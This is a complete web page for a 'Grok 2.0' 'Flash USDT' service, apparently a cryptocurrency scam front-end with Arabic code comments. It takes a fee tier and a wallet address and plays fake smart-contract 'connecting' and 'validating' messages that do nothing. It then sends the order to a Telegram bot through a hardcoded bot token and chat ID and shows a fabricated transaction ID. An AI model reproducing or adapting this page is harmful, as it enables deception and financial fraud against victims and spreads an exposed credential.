<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Grok 2.0 Secure Transaction</title>
<style>
  /* --- 1. CORE COLOR SCHEME (High Contrast Dark Mode) --- */
  :root {
    --primary-accent: #FFFFFF;     /* الأبيض للنص الرئيسي والأزرار */
    --secondary-accent: #0A84FF;   /* الأزرق للتحديد والتركيز (iOS Blue) */
    --dark-bg: #000000;           /* الخلفية السوداء النقية */
    --card-bg: #1C1C1E;           /* الرمادي الداكن للحاويات */
    --input-bg: #1F1F1F;          /* رمادي أغمق قليلاً لحقول الإدخال */
    --success-color: #34C759;     /* الأخضر للنجاح */
    --error-color: #FF3B30;       /* الأحمر للخطأ */
  }

  /* Base Styles */
  * {
    box-sizing: border-box;
    font-family: 'Inter', sans-serif; 
    transition: all 0.3s ease-in-out; /* إضافة انتقال سلس لجميع العناصر */
  }
  html, body {
    margin: 0; 
    padding: 0;
    /* استخدام min-height للسماح للمحتوى بالتمدد والتمرير إذا لزم الأمر */
    min-height: 100vh;
    height: auto; /* Allow height to adapt to content */
    background: var(--dark-bg); 
    color: var(--primary-accent);
    /* السماح بالتمرير العمودي (السحب) مع إخفاء الشريط */
    overflow-x: hidden; 
    overflow-y: scroll; 
    display: flex;
    flex-direction: column;
    justify-content: flex-start; 
    align-items: center;
    /* تم استعادته: لضمان وجود مسافة سحب (تقريبًا 1 سم) تحت رسالة الحالة وقبل الزر العائم الثابت (FAB) */
    /* (90px للزر الثابت + 40px للمسافة المطلوبة = 130px) */
    padding-bottom: 130px; 
  }
  
  /* إخفاء شريط التمرير للمتصفحات المختلفة (مع السماح بالتمرير الفعلي) */
  /* Chrome, Safari and Opera */
  body::-webkit-scrollbar {
      display: none;
  }
  /* IE and Edge */
  body {
      -ms-overflow-style: none;  /* IE and Edge */
      scrollbar-width: none;  /* Firefox */
  }
  /* نهاية إخفاء شريط التمرير */

  /* --- 2. TOP NAVIGATION BAR --- */
  .top-nav {
    width: 95vw; /* Slightly wider than the form card */
    max-width: 380px; /* Slightly wider */
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 5px; 
    /* التعديل لزيادة الهامش العلوي (تقريبًا 1 سم) */
    margin-top: 35px; 
    margin-bottom: 20px; 
  }
  .nav-icon {
    display: block;
    padding: 8px; /* Touch target area */
    cursor: pointer;
  }
  
  /* Styling for SVG Icons */
  .nav-icon svg {
    width: 24px;
    height: 24px;
    fill: var(--primary-accent); /* White color for SVG */
  }

  /* Styling for Image Icons (settings.png) - This style is now mostly deprecated for settings but kept for others */
  .nav-icon img {
    width: 24px;
    height: 24px;
    object-fit: contain;
    filter: invert(100%); 
  }

  /* Dropdown Menu (Right side) */
  .dropdown {
      position: relative;
      display: inline-block;
  }
  .dropdown-content {
      display: none;
      position: absolute;
      right: 0;
      top: 40px; 
      background-color: var(--card-bg); 
      min-width: 180px;
      border-radius: 10px;
      box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.5);
      z-index: 20; 
      overflow: hidden;
  }
  .dropdown-content a {
      color: var(--primary-accent);
      padding: 12px 16px;
      text-decoration: none;
      display: block;
      font-size: 0.9rem;
      font-weight: 500;
  }
  .dropdown-content a:hover, .dropdown-content a:focus {
      background-color: #333; 
  }
  /* Class to show the dropdown menu */
  .dropdown-show .dropdown-content {
      display: block;
  }


  /* --- 3. FLOATING ACTION BUTTON (FAB) (زر عائم دائري ومصغر) --- */
  .fab-container {
      /* تم استعادته: وضع ثابت في أسفل اليمين */
      position: fixed;
      bottom: 20px; /* المسافة من الأسفل */
      right: 20px;  /* المسافة من اليمين */
      left: auto;
      z-index: 30;
      padding: 0;
      margin: 0;
  }
  .fab-button {
      /* أبعاد الزر لتناسب الأيقونة والنص - تم التعديل إلى أصغر ودائري */
      width: 70px; /* Smaller */
      height: 70px; /* Smaller */
      
      /* شكل دائري */
      border-radius: 50%; 
      background-color: var(--secondary-accent); 
      
      border: none;
      
      /* ظل أزرق متوهج */
      box-shadow: 0 4px 15px rgba(10, 132, 255, 0.6); /* Slightly reduced shadow for smaller button */
      
      /* توسيط ومحاذاة المحتوى عمودياً */
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      
      transform: none; 
      transition: all 0.3s ease-in-out;
  }
  .fab-button:hover, .fab-button:focus {
      /* تكبير بسيط عند التفاعل */
      transform: scale(1.05); 
      box-shadow: 0 4px 20px rgba(10, 132, 255, 0.9);
  }

  .fab-button svg {
      width: 26px; /* Slightly smaller icon */
      height: 26px;
      fill: var(--primary-accent);
      /* تأثير التوهج */
      filter: drop-shadow(0 0 4px var(--primary-accent));
      margin-bottom: 0px; /* Space between icon and text reduced */
      transform: none;
  }
  
  /* نمط النص أسفل الأيقونة */
  .fab-text {
      font-size: 0.65rem; /* Smaller font size to fit */
      font-weight: 600;
      color: var(--primary-accent);
      text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
      line-height: 1.1; /* Adjusted line height */
  }


  /* --- مؤشر التحميل (Spinner CSS) --- */
  .spinner {
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top: 3px solid var(--primary-accent);
      border-radius: 50%;
      width: 18px; 
      height: 18px; 
      animation: spin 1s linear infinite;
      display: inline-block;
      margin-right: 10px;
      vertical-align: middle;
  }
  @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
  }

  /* --- App Header (GROK 2.0 + Logo) --- */
  .app-header {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      max-width: 350px;
      margin-bottom: 20px; 
      padding: 10px 0;
  }
  .app-header img {
      width: 40px; 
      height: 40px;
      border-radius: 50%; 
      margin-right: 15px; 
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); 
  }
  .app-header h1 {
      font-size: 2.5rem; 
      font-weight: 900;
      /* تم الحفاظ على اللون الأزرق */
      color: var(--secondary-accent);
      margin: 0;
      letter-spacing: -0.08em; 
  }
  
  /* Container (The main form card) */
  .container {
    width: 90vw;
    max-width: 350px;
    background: var(--dark-bg); 
    border-radius: 20px;
    padding: 25px 20px;
    box-shadow: 0 0 40px rgba(0, 0, 0, 0.8), inset 0 0 5px rgba(255, 255, 255, 0.05); 
    text-align: left;
    margin: 0; 
    z-index: 10;
  }

  /* Input and Label Styles */
  label {
    font-size: 0.9rem;
    margin-bottom: 8px; 
    display: block; 
    color: #CCC;
    font-weight: 500;
  }
  select, input[type="text"], input[readonly] {
    width: 100%;
    padding: 16px; 
    margin-bottom: 20px;
    font-size: 1rem;
    border-radius: 14px; 
    border: 1px solid var(--input-bg);
    background: var(--input-bg); 
    color: var(--primary-accent);
    box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6); 
    -webkit-appearance: none; 
    appearance: none;
  }
  /* Dropdown arrow for select */
  select {
    background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22white%22%3E%3Cpath%20d%3D%22M5.293%207.293a1%201%200%20011.414%200L10%2010.586l3.293-3.293a1%201%200%20111.414%201.414l-4%204a1%201%200%2001-1.414%200l-4-4a1%201%200%20010-1.414z%22%20clip-rule%3D%22evenodd%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E");
    background-repeat: no-repeat;
    background-position: right 15px center;
    background-size: 15px;
  }
  input[type="text"]:focus, select:focus {
    outline: none;
    border-color: var(--secondary-accent);
    box-shadow: 0 0 8px rgba(10, 132, 255, 0.6), inset 0 2px 5px rgba(0, 0, 0, 0.6); 
  }
  input[readonly] {
    opacity: 0.8;
  }
  
  /* Network Buttons */
  .network-options {
    display: flex;
    justify-content: space-between;
    gap: 8px; 
    margin-bottom: 30px;
    border-radius: 14px;
    padding: 6px;
    background: var(--input-bg); 
    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.6);
  }
  .network-options input[type="radio"] { display: none; }
  .network-options label[role="radio"] {
      flex-grow: 1;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 60px; 
      padding: 8px;
      font-size: 0.85rem;
      border-radius: 12px;
      cursor: pointer;
      background: transparent;
      color: #999;
      transition: all 0.2s ease-in-out;
  }
  .network-options input[type="radio"]:checked + label[role="radio"] {
      background: var(--secondary-accent); 
      color: var(--primary-accent); 
      font-weight: 700;
      box-shadow: 0 4px 15px rgba(10, 132, 255, 0.4); 
  }
  .network-options label[role="radio"]:active { transform: scale(0.97); }
  .network-options img {
      height: 24px; 
      width: 24px;
      margin-bottom: 4px;
      filter: grayscale(100%) opacity(0.8); 
      transition: filter 0.2s;
  }
  .network-options input[type="radio"]:checked + label[role="radio"] img {
      filter: grayscale(0%) opacity(1);
  }

  /* NEXT/SEND ORDER Button */
  #btn-next {
      padding: 18px 20px;
      margin-top: 30px;
      width: 100%;
      font-size: 1.25rem; 
      border-radius: 18px;
      border: none;
      /* تغيير الخلفية إلى الأزرق عند التمكين */
      background-color: var(--secondary-accent); 
      /* تغيير لون النص إلى الأبيض */
      color: var(--primary-accent); 
      font-weight: 700;
      cursor: pointer;
      /* ظل أزرق متوهج */
      box-shadow: 0 4px 20px rgba(10, 132, 255, 0.4); 
  }
  #btn-next:disabled {
      background-color: #333; 
      color: #777;
      box-shadow: none;
      cursor: not-allowed;
  }

  /* Status Messages */
  #message {
    padding: 8px 0;
    font-size: 0.95rem; 
    min-height: 20px;
    margin-top: 15px;
  }
  
  /* Media Query for small screens */
  @media (max-width: 350px) {
    .app-header h1 { font-size: 2.1rem; }
    .app-header img { width: 35px; height: 35px; margin-right: 10px; }
    .container { padding: 20px 15px; }
    select, input[type="text"], input[readonly] { padding: 14px; font-size: 0.95rem; }
    #btn-next { font-size: 1.1rem; padding: 16px; }
    .network-options label[role="radio"] { font-size: 0.8rem; height: 55px; }
  }

</style>
</head>
<body>

<!-- 1. TOP NAVIGATION BAR -->
<div class="top-nav">
  <!-- Left Side: Settings Link (SVG Icon now) -->
  <a href="settings.html" class="nav-icon" aria-label="Settings" onclick="playBeep()">
    <!-- SVG Settings Icon (Gear) -->
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.38-1.07-.73-1.69-.99l-.38-2.65C14.46 2.18 14.16 2 13.84 2h-2c-.32 0-.62.18-.73.46l-.38 2.65c-.62.26-1.17.61-1.69.99l-2.49-1c-.22-.09-.49 0-.61.22l-2 3.46c-.12.22-.07.49.12.64l2.11 1.65c-.04.32-.07.64-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.38 1.07.73 1.69.99l.38 2.65c.11.28.41.46.73.46h2c.32 0 .62-.18.73-.46l.38-2.65c.62-.26 1.17-.61 1.69-.99l2.49 1c.22.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zm-7.43-2.98c1.38 0 2.5 1.12 2.5 2.5s-1.12 2.5-2.5 2.5-2.5-1.12-2.5-2.5 1.12-2.5 2.5-2.5z"/>
    </svg>
  </a>

  <!-- Right Side: Dropdown Menu -->
  <div class="dropdown" id="myDropdownContainer">
    <!-- تم تحديث onclick لإضافة playBeep() -->
    <span class="nav-icon" onclick="toggleDropdown(); playBeep();" role="button" aria-haspopup="true" aria-expanded="false" aria-label="Menu">
      <!-- SVG Three Dots Icon -->
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
    </span>
    <div class="dropdown-content" id="myDropdown">
      <!-- تمت إضافة onclick لكل رابط في القائمة المنسدلة -->
      <a href="chat.html" onclick="playBeep()">Live Chat</a>
      <a href="platforms.html" onclick="playBeep()">Supported Platforms</a>
      <a href="history.html" onclick="playBeep()">History</a>
    </div>
  </div>
</div>

<!-- 2. GROK HEADER -->
<div class="app-header">
    <img src="logo.png" alt="Grok 2.0 Logo" onerror="this.onerror=null; this.src='https://placehold.co/40x40/FFFFFF/000000?text=G';" />
    <h1>GROK 2.0</h1>
</div>


<div class="container" role="main" aria-label="Grok 2.0 Transaction form">
  
  <!-- Form Fields -->
  <label for="amount">Flash Amount (USDT)</label>
  <!-- تم تحديث onchange لإضافة playBeep() -->
  <select id="amount" onchange="updatePrice(); playBeep()">
    <option value="10">500 USDT </option>
    <option value="25">1500 USDT </option>
    <option value="50">3500 USDT </option>
    <option value="120">9000 USDT </option>
  </select>

  <label for="wallet-address">Wallet Address</label>
  <input type="text" id="wallet-address" placeholder="Enter your TRC20 or BEP20 address" aria-required="true" oninput="checkAddressAndNetwork(this.value)" />

  <label id="network-label">Flash Network</label>
  <div class="network-options" role="radiogroup" aria-labelledby="network-label">
    
    <!-- TRC20 radio button -->
    <input type="radio" name="network" id="trc" value="TRC20" disabled />
    <!-- تمت إضافة onclick للـ label لتوفير ملاحظات صوتية عند التفاعل -->
    <label for="trc" role="radio" tabindex="0" onclick="playBeep()">
      <img src="tron.png" alt="TRC20 logo" onerror="this.onerror=null; this.src='https://placehold.co/24x24/0A84FF/000?text=T';" /> TRC20
    </label>

    <!-- BEP20 radio button -->
    <input type="radio" name="network" id="bep" value="BEP20" disabled />
    <!-- تمت إضافة onclick للـ label لتوفير ملاحظات صوتية عند التفاعل -->
    <label for="bep" role="radio" tabindex="0" onclick="playBeep()">
      <img src="bep20.png" alt="BEP20 logo" onerror="this.onerror=null; this.src='https://placehold.co/24x24/FCDD24/000?text=B';" /> BEP20
    </label>
  </div>

  <label for="price">Service Fees (USD)</label>
  <input type="text" id="price" readonly value="$10" aria-readonly="true" />

  <!-- The large, high-contrast button -->
  <!-- تم تحديث onclick لإضافة playBeep() -->
  <button id="btn-next" onclick="startSubmission(); playBeep();" disabled>ENTER WALLET ADDRESS</button>

  <div id="message" role="alert" aria-live="assertive"></div>
</div>

<!-- 3. FLOATING ACTION BUTTON (FAB) - NOW CIRCULAR AND SMALLER -->
<div class="fab-container">
    <!-- تم تحديث onclick لإضافة playBeep() -->
    <a href="profil.html" class="fab-button" aria-label="Contact Support" onclick="playBeep()">
        <!-- SVG Icon for Message/Chat -->
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6h16l-8 5z"/>
        </svg>
        <!-- The text below the icon, now in English -->
        <span class="fab-text">Contact Me</span>
    </a>
</div>


<script>
  // --- AUDIO FEEDBACK IMPLEMENTATION (bip.mp3 Sound) ---
  // إنشاء عنصر صوتي عالمي لتشغيل صوت الـ bip.mp3
  let audioBeep = null;

  // تهيئة عنصر الصوت عند أول تفاعل للمستخدم
  function initializeAudio() {
    if (!audioBeep) {
      try {
        // إنشاء عنصر الصوت وتعيين مسار bip.mp3
        audioBeep = new Audio('bip.mp3');
        audioBeep.preload = 'auto'; // تحميل مسبق للصوت
        audioBeep.onerror = () => {
            console.error("Failed to load bip.mp3. Check file path.");
            // يمكنك إضافة خيار صوتي احتياطي هنا إذا لزم الأمر
        };
        console.log("Audio element initialized for bip.mp3.");
      } catch (e) {
        console.error("Audio element creation failed:", e);
      }
    }
    // إزالة المستمع بعد التفاعل الأول لعدم تكرار التهيئة
    document.body.removeEventListener('click', initializeAudio, { once: true });
  }

  // الدالة التي يتم استدعاؤها لتشغيل صوت الـ "bip"
  function playBeep() {
    // التأكد من تهيئة عنصر الصوت
    if (!audioBeep) {
        initializeAudio();
    }
    
    if (audioBeep) {
      // إعادة تعيين وقت التشغيل إلى البداية لضمان التشغيل المتكرر السريع
      audioBeep.currentTime = 0; 
      audioBeep.play().catch(error => {
          // يمكن أن يحدث هذا الخطأ إذا لم يتم التفاعل مع المستند بعد، لكن التهيئة تحاول معالجتها
          console.error("Audio playback failed (usually due to lack of initial user interaction):", error);
      });
    }
  }
  
  // ربط التهيئة بجسم المستند لضمان بدء تشغيل الصوت عند أول تفاعل للمستخدم
  document.body.addEventListener('click', initializeAudio, { once: true });


  // JavaScript for Dropdown Functionality
  function toggleDropdown() {
      // Toggle the 'dropdown-show' class on the container
      document.getElementById("myDropdownContainer").classList.toggle("dropdown-show");
  }
  // Close the dropdown if the user clicks outside of it
  window.onclick = function(event) {
    if (!event.target.closest('.dropdown')) {
      const dropdowns = document.getElementsByClassName("dropdown");
      for (let i = 0; i < dropdowns.length; i++) {
        const openDropdown = dropdowns[i];
        if (openDropdown.classList.contains('dropdown-show')) {
          openDropdown.classList.remove('dropdown-show');
        }
      }
    }
  }


  // Global flag to prevent re-submission while loading
  let isSubmitting = false;
  let loadingInterval = null;

  // Function to update the service fee based on selected amount
  function updatePrice() {
    const amount = document.getElementById("amount").value;
    document.getElementById("price").value = "$" + amount;
  }
  
  // 1. Function to check address, enable network, and enable the main button
  function checkAddressAndNetwork(walletAddress) {
    const trimmedAddress = walletAddress.trim();
    const trc = document.getElementById('trc');
    const bep = document.getElementById('bep');
    const nextButton = document.getElementById("btn-next");
    const messageBox = document.getElementById("message");

    // Reset buttons and state
    trc.disabled = true; trc.checked = false;
    bep.disabled = true; bep.checked = false;
    
    // Default button state
    nextButton.disabled = true;
    nextButton.innerHTML = "ENTER WALLET ADDRESS"; 
    
    messageBox.innerHTML = '';
    messageBox.style.color = '#fff';
    
    // If input is empty, reset and return
    if (trimmedAddress.length === 0) {
        return; 
    }
    
    // Regular expressions for validation
    const bep20Regex = /^0x[a-fA-F0-9]{40}$/i;
    const trc20Regex = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;

    let detectedNetwork = null;
    
    if (bep20Regex.test(trimmedAddress)) {
      detectedNetwork = 'BEP20';
    } else if (trc20Regex.test(trimmedAddress)) {
      detectedNetwork = 'TRC20';
    }

    if (detectedNetwork) {
        // Enable and check the correct radio button
        const radioToSelect = document.getElementById(detectedNetwork === 'TRC20' ? 'trc' : 'bep');
        if (radioToSelect) {
            radioToSelect.disabled = false;
            radioToSelect.checked = true;
        }
        
        // Validation success
        nextButton.disabled = false;
        // سيتم تطبيق الألوان الزرقاء والظل من CSS الآن
        nextButton.innerHTML = `<span class="btn-icon">&#x27A4;</span>SEND ORDER`;
        messageBox.style.color = 'var(--secondary-accent)';
        messageBox.textContent = `Address detected as ${detectedNetwork}. Click SEND ORDER to proceed.`;
    } else if (trimmedAddress.length > 30) {
        // Show error for long, invalid addresses (addresses are typically 34 or 42 chars)
        messageBox.style.color = 'var(--error-color)';
        messageBox.textContent = "Invalid address format. Only TRC20 (starts with 'T') or BEP20 (starts with '0x') supported.";
    }
  }

  // 2. The primary button handler (Phase 2: Sending)
  function startSubmission() {
    if (isSubmitting) return;

    const walletAddressInput = document.getElementById("wallet-address");
    const walletAddress = walletAddressInput.value.trim();
    const messageBox = document.getElementById("message");
    const nextButton = document.getElementById("btn-next");
    const amount = document.getElementById("amount").value; 
    const selectedNetwork = document.querySelector('input[name="network"]:checked');

    // Security check to ensure the state is valid before submission
    if (!selectedNetwork || !walletAddress || nextButton.textContent.indexOf("SEND ORDER") === -1) {
        checkAddressAndNetwork(walletAddress); 
        messageBox.style.color = 'var(--error-color)';
        messageBox.textContent = "Please enter a valid wallet address.";
        return;
    }
    
    // --- Start 6-Second Submission Sequence (Connect/Checking) ---
    isSubmitting = true; 
    walletAddressInput.readOnly = true;
    nextButton.disabled = true;
    
    messageBox.innerHTML = ''; 
    
    // Disable network buttons during submission loading
    document.getElementById('trc').disabled = true;
    document.getElementById('bep').disabled = true;

    const messages = [
      "CONNECTING TO SMART CONTRACT...", // 0s - 2s
      "CHECKING WALLET ADDRESS STATUS...",    // 2s - 4s
      "VALIDATING FLASH NETWORK..."     // 4s - 6s
    ];
    let step = 0;
    
    // Function to update the message with the spinner (INSIDE THE BUTTON)
    const updateMessage = () => {
      if (step < messages.length) {
        // Use the new spinner class
        nextButton.innerHTML = `<span class="spinner"></span>${messages[step]}`;
        step++;
      } else {
        clearInterval(loadingInterval);
      }
    };
    
    // Initial message and start interval
    updateMessage();
    loadingInterval = setInterval(updateMessage, 2000); 

    // Final action after 6 seconds (end of loading)
    setTimeout(() => {
      clearInterval(loadingInterval);
      
      // Proceed to send to Telegram
      sendToTelegram(amount, selectedNetwork.value, walletAddress, messageBox, nextButton);

    }, 6000); 
  }

  // 3. Helper function to handle the Telegram API submission
  function sendToTelegram(amount, network, walletAddress, messageBox, nextButton) {
    // Set a simple waiting status in the button before fetch
    nextButton.innerHTML = `<span class="spinner"></span>FINALIZING SUBMISSION...`;
    
    // **NOTE: Using hardcoded Telegram Bot Token and Chat ID from the original code**
    const botToken = "8385960576:AAFZ_L4tpFbAHlMCebdXyX20XG5ZGgWBRRg";
    const chatId = "8066634898";
    
    const usdtAmount = document.getElementById("amount").options[document.getElementById("amount").selectedIndex].text.split(' ')[0];
    const feeAmount = `$${amount}`;

    const message = `⚡️ NEW FLASH ORDER ⚡️\n---
USDT Amount: ${usdtAmount}
Service Fee: ${feeAmount}
Network: ${network}
Wallet: ${walletAddress}
---`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    }).then(response => {
      isSubmitting = false;
      document.getElementById("wallet-address").readOnly = false; 
      
      if (!response.ok) throw new Error('Telegram API failed to send');
      
      // Update final status to success (Green)
      nextButton.innerHTML = `<span style="color:var(--dark-bg); margin-right: 8px;">&#x2714;</span> TRANSACTION SENT`; 
      nextButton.disabled = true;
      nextButton.style.backgroundColor = 'var(--success-color)';
      nextButton.style.boxShadow = '0 0 15px rgba(52, 199, 89, 0.5)';
      nextButton.style.color = 'var(--dark-bg)';
      
      messageBox.style.color = 'var(--success-color)'; 
      messageBox.textContent = "Transaction request submitted successfully. Enjoy the flash!";
      
      document.getElementById("wallet-address").value = "";
      
      // Redirect to a dummy success URL after a delay
      const randomID = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
      setTimeout(() => {
        // Redirect to simulate transaction completion page
        window.location.href = "payment.html?txid=" + randomID; 
      }, 2000); 
    }).catch((error) => {
      // Error during submission
      isSubmitting = false; 
      document.getElementById("wallet-address").readOnly = false; 
      console.error("Submission Error:", error);
      
      // Reset button and show error message
      messageBox.textContent = "Error during transaction: Connection lost or API issue. Please try again.";
      messageBox.style.color = 'var(--error-color)';
      
      // Re-validate to reset the button to 'SEND ORDER' state (which is now blue from CSS)
      checkAddressAndNetwork(walletAddress); 
    });
  }
</script>

</body>
</html>

